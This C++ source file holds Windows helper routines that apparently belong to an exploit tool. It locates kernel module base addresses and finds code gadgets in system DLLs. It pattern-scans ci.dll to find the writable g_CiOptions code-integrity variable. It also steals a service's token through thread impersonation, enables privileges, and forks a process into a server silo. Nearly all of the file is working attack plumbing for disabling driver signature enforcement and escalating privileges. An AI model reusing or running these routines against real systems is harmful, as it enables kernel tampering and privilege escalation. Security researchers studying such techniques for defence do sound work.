#include "common.h"
#include "nt.h"
#include <iostream>
#include <strsafe.h>
#include <tlhelp32.h>

VOID Common::PrintSystemError(_In_ DWORD ErrorCode)
{
    LPWSTR pwszErrorMessage = NULL;

    FormatMessageW(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        ErrorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPWSTR)&pwszErrorMessage,
        0,
        NULL
    );

    if (pwszErrorMessage)
    {
        wprintf(L"%ws", pwszErrorMessage);
        LocalFree(pwszErrorMessage); // FORMAT_MESSAGE_ALLOCATE_BUFFER
    }
    else
    {
        PRINT_ERROR_WIN32(L"FormatMessageW");
    }
}

LPVOID Common::Alloc(_In_ SIZE_T Size)
{
    LPVOID lpMem = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, Size);

    if (!lpMem)
    {
        PRINT_ERROR_WIN32(L"HeapAlloc");
        return NULL;
    }

    return lpMem;
}

BOOL Common::Free(_In_ LPVOID Mem)
{
    if (!HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, Mem))
    {
        PRINT_ERROR_WIN32(L"HeapFree");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::FindKernelModuleBaseAddress(_In_ LPCSTR ModuleName, _Inout_ PULONG_PTR ModuleAddress)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    ULONG size = 0;
    PRTL_PROCESS_MODULES pModules = NULL;

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, NULL, 0, &size);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
    {
        PRINT_ERROR_NT(L"NtQuerySystemInformation", status);
        goto exit;
    }

    if (!(pModules = (PRTL_PROCESS_MODULES)Common::Alloc(size))) goto exit;

    status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, pModules, size, &size);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtQuerySystemInformation", status);
        goto exit;
    }

    for (ULONG i = 0; i < pModules->NumberOfModules; i++)
    {
        RTL_PROCESS_MODULE_INFORMATION Module = pModules->Modules[i];

        if (_stricmp(ModuleName, (PCHAR)Module.FullPathName + Module.OffsetToFileName) == 0)
        {
            *ModuleAddress = (ULONG_PTR)Module.ImageBase;
            bResult = TRUE;
            break;
        }
    }

    if (!bResult)
        PRINT_ERROR_A("Could not determine base address of kernel module '%s'.\n", ModuleName);

exit:
    if (pModules) Common::Free(pModules);

    return bResult;
}

BOOL Common::EnumModuleSections(_In_ HMODULE Module, _Inout_ std::vector<ImageSectionHeaderInfo> &SectionList)
{
    BOOL bResult = FALSE;
    const DWORD dwBufferSize = 0x1000;
    PIMAGE_NT_HEADERS pNtHeaders = NULL;
    PIMAGE_SECTION_HEADER pSectionHeader;
    PBYTE pBuffer = NULL;

    SectionList.clear();

    if (!(pBuffer = (PBYTE)Common::Alloc(dwBufferSize))) goto exit;
    if (!(pNtHeaders = RtlImageNtHeader(Module))) goto exit;

    for (DWORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
    {
        pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNtHeaders + sizeof(*pNtHeaders) + i * sizeof(*pSectionHeader));

        ImageSectionHeaderInfo ish = ImageSectionHeaderInfo();

        ZeroMemory(ish.Name, sizeof(ish.Name));
        memcpy(ish.Name, pSectionHeader->Name, sizeof(pSectionHeader->Name));
        ish.VirtualAddress = pSectionHeader->VirtualAddress;
        ish.VirtualSize = pSectionHeader->Misc.VirtualSize;
        ish.Characteristics = pSectionHeader->Characteristics;

        SectionList.push_back(ish);
    }

    bResult = SectionList.size() == pNtHeaders->FileHeader.NumberOfSections;

exit:
    if (pBuffer) Common::Free(pBuffer);

    return bResult;
}

BOOL Common::FindModuleSection(_In_ HMODULE Module, _In_ LPCSTR SectionName, _Inout_ ImageSectionHeaderInfo& Section)
{
    BOOL bResult = FALSE;
    std::vector<ImageSectionHeaderInfo> sections;

    if (!Common::EnumModuleSections(Module, sections)) goto exit;

    for (auto& section : sections)
    {
        if (_stricmp(SectionName, section.Name) == 0)
        {
            Section = section;
            bResult = TRUE;
            break;
        }
    }

exit:
    if (!bResult) PRINT_ERROR_A("Could not find section '%s' in module @ 0x%llx\n", SectionName, (ULONG_PTR)Module);

    return bResult;
}

BOOL Common::IsWritableAddress(_In_ HMODULE Module, _In_ ULONG_PTR Address)
{
    BOOL bResult = FALSE;
    std::vector<ImageSectionHeaderInfo> sections;
    ULONG_PTR pSectionStart, pSectionEnd;

    if (!Common::EnumModuleSections(Module, sections)) goto exit;

    for (auto& section : sections)
    {
        pSectionStart = (ULONG_PTR)Module + section.VirtualAddress;
        pSectionEnd = pSectionStart + section.VirtualSize;

        if (Address >= pSectionStart && Address < pSectionEnd)
        {
            if (section.Characteristics & IMAGE_SCN_MEM_WRITE)
            {
                bResult = TRUE;
                break;
            }
        }
    }

exit:

    return bResult;
}

BOOL Common::FindPatternOffset(_In_ LPVOID Buffer, _In_ DWORD BufferSize, _In_ PBYTE Pattern, _In_ DWORD PatternSize, _Out_ PDWORD PatternOffset)
{
    BOOL bResult = FALSE;
    PVOID pCurrentAddress = NULL;

    *PatternOffset = 0;

    __try
    {
        for (DWORD i = 0; i < BufferSize - PatternSize; i++)
        {
            pCurrentAddress = (PVOID)((ULONG_PTR)Buffer + i);
            if (memcmp((PBYTE)pCurrentAddress, Pattern, PatternSize) == 0)
            {
                *PatternOffset = i;
                bResult = TRUE;
                break;
            }
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
        PRINT_WARNING(L"Exception while accessing memory @ 0x%llx (err=0x%08x)\n", (ULONG_PTR)pCurrentAddress, GetExceptionCode());
    }

    return bResult;
}

BOOL Common::FindGadgetOffset(_In_ LPCWSTR Module, _In_ PBYTE Gadget, _In_ DWORD GadgetSize, _Out_ PDWORD GadgetOffset)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    ULONG_PTR pSectionAddress;
    std::vector<Common::ImageSectionHeaderInfo> sections;
    DWORD dwPatternOffset;

    *GadgetOffset = 0;

    // Dirty hack
    if (!(hModule = LoadLibraryExW(Module, NULL, DONT_RESOLVE_DLL_REFERENCES)))
    {
        PRINT_ERROR_WIN32(L"LoadLibraryExW");
        goto exit;
    }

    //PRINT_VERBOSE(L"Module loaded @ 0x%llx\n", (ULONG_PTR)hModule);

    if (!Common::EnumModuleSections(hModule, sections)) goto exit;

    for (auto& section : sections)
    {
        if (section.Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE))
        {
            pSectionAddress = (ULONG_PTR)hModule + section.VirtualAddress;
            //PRINT_VERBOSE_A("Searching %s @ 0x%llx (size=%d)\n", section.Name, pSectionAddress, section.VirtualSize);
            if (Common::FindPatternOffset((LPVOID)pSectionAddress, section.VirtualSize, Gadget, GadgetSize, &dwPatternOffset))
            {
                *GadgetOffset = section.VirtualAddress + dwPatternOffset;
                //PRINT_VERBOSE(L"Pattern offset: 0x%08x\n", *GadgetOffset);
                bResult = TRUE;
                break;
            }
        }
    }

exit:
    if (hModule) FreeLibrary(hModule);
    if (!bResult) PRINT_ERROR(L"Cound not find gadget of size %d in module '%ws'.\n", GadgetSize, Module);

    return bResult;
}

BOOL Common::FindCiOptionsOffset(_Out_ PDWORD Offset)
{
    BOOL bResult = FALSE;
    HMODULE hModule = NULL;
    auto section = Common::ImageSectionHeaderInfo();
    PVOID pCiInitialize = NULL;

    *Offset = 0;

    // Dirty hack
    if (!(hModule = LoadLibraryExW(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES)))
    {
        PRINT_ERROR_WIN32(L"LoadLibraryExW");
        goto exit;
    }

    //PRINT_VERBOSE("ci.dll @ 0x%llx\n", (ULONG_PTR)hModule);

    if (!Common::FindModuleSection(hModule, ".text", section)) goto exit;

    if (!(pCiInitialize = GetProcAddress(hModule, "CiInitialize")))
    {
        PRINT_ERROR_WIN32(L"GetProcAddress");
        goto exit;
    }

    //PRINT_VERBOSE(L"CiInitialize @ 0x%llx\n", (ULONG_PTR)pCiInitialize);

    for (DWORD i = 0; i < 128; i++)
    {
        LONG lRelativeOffset; // RIP-relative offset can be negative!
        ULONG_PTR pCallTarget, pCiOptions;

        // Is it a potential "CALL near" instruction?
        // E8 XX XX XX XX, where XX XX XX XX is a RIP-relative offset (x86_64)
        if (((PBYTE)pCiInitialize)[i] == 0xe8)
        {
            __try
            {
                // We found a potential CALL instruction, so let's extract the next
                // 4 bytes to calculate the RIP-relative address of the target function.
                memcpy(&lRelativeOffset, &(((PBYTE)pCiInitialize)[i + 1]), sizeof(lRelativeOffset));
                pCallTarget = (ULONG_PTR) & ((PBYTE)pCiInitialize)[i + 5] + (LONGLONG)lRelativeOffset;

                // Now, read up to 128 bytes of memory starting from the address of the
                // target function, and try to find the expected MOV instruction.
                for (DWORD j = 0; j < 128; j++)
                {
                    // Is it a potential "MOV dword ptr [xxx], ecx" instruction?
                    // 89 0D XX XX XX XX, where XX XX XX XX is a RIP-relative offset (x86_64)
                    if (((PBYTE)pCallTarget)[j] == 0x89 && ((PBYTE)pCallTarget)[j + 1] == 0x0d)
                    {
                        // We may have found the MOV instruction we were looking for, so let's extract
                        // the next 4 bytes and calculates the RIP-relative address of the target pointer.
                        memcpy(&lRelativeOffset, &((PBYTE)pCallTarget)[j + 2], sizeof(lRelativeOffset));
                        pCiOptions = (ULONG_PTR) & ((PBYTE)pCallTarget)[j + 6] + (LONGLONG)lRelativeOffset;

                        // Check whether the target address is within a writable memory range. If so, we
                        // are quiet sure we found the correct address/offset. Otherwise, we are sure the
                        // address/offset is incorrect, and we should exit gracefully to avoid causing
                        // a BSOD at a further time because of an illegal memory write.
                        if (Common::IsWritableAddress(hModule, pCiOptions))
                        {
                            *Offset = (DWORD)(pCiOptions - (ULONG_PTR)hModule);
                            bResult = TRUE;
                        }
                        else
                        {
                            PRINT_ERROR(L"Address 0x%llx not within a writeable memory range!\n", pCiOptions);
                        }
                    }

                    if (*Offset) break;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                PRINT_WARNING(L"Exception while accessing memory (err=0x%08x)\n", GetExceptionCode());
            }
        }

        if (*Offset) break;
    }

exit:
    if (hModule) FreeLibrary(hModule);
    if (!bResult) PRINT_ERROR(L"Cound not find offset of global variable g_CiOptions in module 'ci.dll'.\n");

    return bResult;
}

BOOL Common::EnablePrivilege(_In_opt_ HANDLE Token, _In_ LPCWSTR Privilege)
{
    BOOL bResult = FALSE, bPrivilegeFound = FALSE;
    HANDLE hToken = NULL;
    DWORD dwTokenInfoSize, dwPrivilegeNameLength;
    PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
    LUID_AND_ATTRIBUTES laa = { 0 };
    LPWSTR pwszPrivilegeNameTemp = NULL;
    TOKEN_PRIVILEGES tp = { 0 };

    if (Token)
    {
        hToken = Token;
    }
    else
    {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
        {
            PRINT_ERROR_WIN32(L"OpenProcessToken");
            goto exit;
        }
    }

    if (!GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwTokenInfoSize))
    {
        if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
        {
            PRINT_ERROR_WIN32(L"GetTokenInformation");
            goto exit;
        }
    }

    if (!(pTokenPrivileges = (PTOKEN_PRIVILEGES)Common::Alloc(dwTokenInfoSize))) goto exit;

    if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenInfoSize, &dwTokenInfoSize))
    {
        PRINT_ERROR_WIN32(L"GetTokenInformation");
        goto exit;
    }

    for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
    {
        laa = pTokenPrivileges->Privileges[i];
        dwPrivilegeNameLength = 0;

        if (!LookupPrivilegeNameW(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
        {
            if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            {
                PRINT_ERROR_WIN32(L"LookupPrivilegeNameW");
                goto exit;
            }
        }

        dwPrivilegeNameLength += 1;

        if (pwszPrivilegeNameTemp = (LPWSTR)Common::Alloc(dwPrivilegeNameLength * sizeof(*pwszPrivilegeNameTemp)))
        {
            if (LookupPrivilegeNameW(NULL, &(laa.Luid), pwszPrivilegeNameTemp, &dwPrivilegeNameLength))
            {
                if (_wcsicmp(pwszPrivilegeNameTemp, Privilege) == 0)
                {
                    bPrivilegeFound = TRUE;

                    ZeroMemory(&tp, sizeof(tp));
                    tp.PrivilegeCount = 1;
                    tp.Privileges[0].Luid = laa.Luid;
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

                    if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL))
                        bResult = TRUE;
                    else
                        PRINT_ERROR_WIN32(L"AdjustTokenPrivileges");
                        

                    
                    break;
                    
                }
            }
            else
            {
                PRINT_ERROR_WIN32(L"LookupPrivilegeNameW");
            }

            Common::Free(pwszPrivilegeNameTemp);
        }
    }

exit:
    if (!bPrivilegeFound)
    {
        SetLastError(ERROR_PRIVILEGE_NOT_HELD);
        PRINT_ERROR_WIN32(L"EnablePrivilege");
    }
    
    if (pTokenPrivileges) Common::Free(pTokenPrivileges);
    if (!Token && hToken) CloseHandle(hToken);

    return bResult;
}

BOOL Common::QueryServiceProcessId(_In_ LPCWSTR Service, _Out_ PDWORD ProcessId)
{
    BOOL bResult = FALSE;
    SC_HANDLE hSCM = NULL, hService = NULL;
    SERVICE_STATUS_PROCESS ssp = { 0 };
    DWORD dwBytesNeeded = 0;

    *ProcessId = 0;

    if (!(hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)))
    {
        PRINT_ERROR_WIN32(L"OpenSCManagerW");
        goto exit;
    }

    if (!(hService = OpenServiceW(hSCM, Service, SERVICE_QUERY_STATUS)))
    {
        PRINT_ERROR_WIN32(L"OpenServiceW");
        goto exit;
    }

    if (!QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &dwBytesNeeded))
    {
        PRINT_ERROR_WIN32(L"QueryServiceStatusEx");
        goto exit;
    }

    *ProcessId = ssp.dwProcessId;
    bResult = TRUE;

exit:
    if (hService) CloseServiceHandle(hService);
    if (hSCM) CloseServiceHandle(hSCM);

    return bResult;
}

BOOL Common::OpenServiceToken(_In_ LPCWSTR Service, _Out_ PHANDLE Token)
{
    BOOL bResult = FALSE, bImpersonation = FALSE;
    NTSTATUS status;
    DWORD dwServicePid = 0;
    HANDLE hThread = NULL, hToken = NULL;
    HANDLE hSnapshot = INVALID_HANDLE_VALUE;
    THREADENTRY32 the = { 0 };
    SECURITY_QUALITY_OF_SERVICE sqos = { 0 };

    *Token = NULL;

    if (!Common::QueryServiceProcessId(Service, &dwServicePid)) goto exit;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        PRINT_ERROR_WIN32(L"CreateToolhelp32Snapshot");
        goto exit;
    }

    the.dwSize = sizeof(the);

    if (!Thread32First(hSnapshot, &the))
    {
        PRINT_ERROR_WIN32(L"Thread32First");
        goto exit;
    }

    do
    {
        if (the.th32OwnerProcessID == dwServicePid)
        {
            if (hThread = OpenThread(THREAD_DIRECT_IMPERSONATION, FALSE, the.th32ThreadID))
                break;
        }

    } while (Thread32Next(hSnapshot, &the));

    if (!hThread)
    {
        PRINT_ERROR_WIN32(L"OpenThread");
        goto exit;
    }

    ZeroMemory(&sqos, sizeof(sqos));
    sqos.Length = sizeof(sqos);
    sqos.ImpersonationLevel = SecurityImpersonation;

    status = NtImpersonateThread(GetCurrentThread(), hThread, &sqos);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtImpersonateThread", status);
        goto exit;
    }

    bImpersonation = TRUE;

    if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, FALSE, &hToken))
    {
        PRINT_ERROR_WIN32(L"OpenThreadToken");
        goto exit;
    }

    *Token = hToken;
    bResult = TRUE;

exit:
    if (!bResult && hToken) CloseHandle(hToken);
    if (bImpersonation) RevertToSelf();
    if (hThread) CloseHandle(hThread);
    if (hSnapshot && hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);

    return bResult;
}

BOOL Common::ImpersonateToken(_In_ HANDLE Token)
{
    HANDLE hThread = GetCurrentThread();

    if (!SetThreadToken(&hThread, Token))
    {
        PRINT_ERROR_WIN32(L"SetThreadToken");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::RevertImpersonation()
{
    if (!RevertToSelf())
    {
        PRINT_ERROR_WIN32(L"RevertToSelf");
        return FALSE;
    }

    return TRUE;
}

BOOL Common::ForkProcessIntoServerSilo(_In_ HANDLE ServerSilo, _Out_ LPPROCESS_INFORMATION ProcessInformation)
{
    BOOL bResult = FALSE;
    NTSTATUS status;
    HANDLE hJobList[1] = { 0 };
    HANDLE hProcess, hThread;
    PS_CREATE_INFO ci = { 0 };
    PPS_ATTRIBUTE_LIST pAttributeList = NULL;
    const DWORD dwAttributeCount = 1;
    const SIZE_T attributeListSize = sizeof(PS_ATTRIBUTE_LIST) + ((SIZE_T)dwAttributeCount - 1) * sizeof(PS_ATTRIBUTE);

    *ProcessInformation = { 0 };

    ci.Size = sizeof(ci);

    if (!(pAttributeList = (PPS_ATTRIBUTE_LIST)Common::Alloc(attributeListSize))) goto exit;

    hJobList[0] = ServerSilo;

    pAttributeList->TotalLength = attributeListSize;

    pAttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_JOB_LIST;
    pAttributeList->Attributes[0].Size = sizeof(hJobList);
    pAttributeList->Attributes[0].ValuePtr = &hJobList;

    status = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, NULL, &ci, pAttributeList);
    if (!NT_SUCCESS(status))
    {
        PRINT_ERROR_NT(L"NtCreateUserProcess", status);
        goto exit;
    }

    if (status == STATUS_SUCCESS)
    {
        // Parent process
        ProcessInformation->hProcess = hProcess;
        ProcessInformation->hThread = hThread;
        ProcessInformation->dwProcessId = GetProcessId(hProcess);
        ProcessInformation->dwThreadId = GetProcessId(hProcess);
        bResult = TRUE;
    }
    else if (status == STATUS_PROCESS_CLONED)
    {
        // Forked process
        bResult = TRUE;
    }
    else
    {
        // ??? Oo
        PRINT_WARNING(L"Unexpected status code: 0x%08x\n", status);
    }

exit:
    if (pAttributeList) Common::Free(pAttributeList);

    return bResult;
}